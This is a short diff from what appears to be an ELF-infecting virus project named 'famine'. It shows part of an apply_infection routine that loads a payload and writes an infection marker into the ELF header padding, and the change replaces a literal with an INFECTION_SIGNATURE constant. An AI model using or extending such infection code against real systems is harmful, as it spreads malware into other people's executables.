@@ -35,7 +35,7 @@ void apply_infection(t_famine *famine)
     load_payload(famine, PAYLOAD_NAME_64);
 
     // Set a flag in the EI_PAD header padding that indicate the file have been infected.
-    famine->ehdr->e_ident[EI_PAD + 3] = 7;
+    famine->ehdr->e_ident[EI_PAD + 3] = INFECTION_SIGNATURE;
 
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
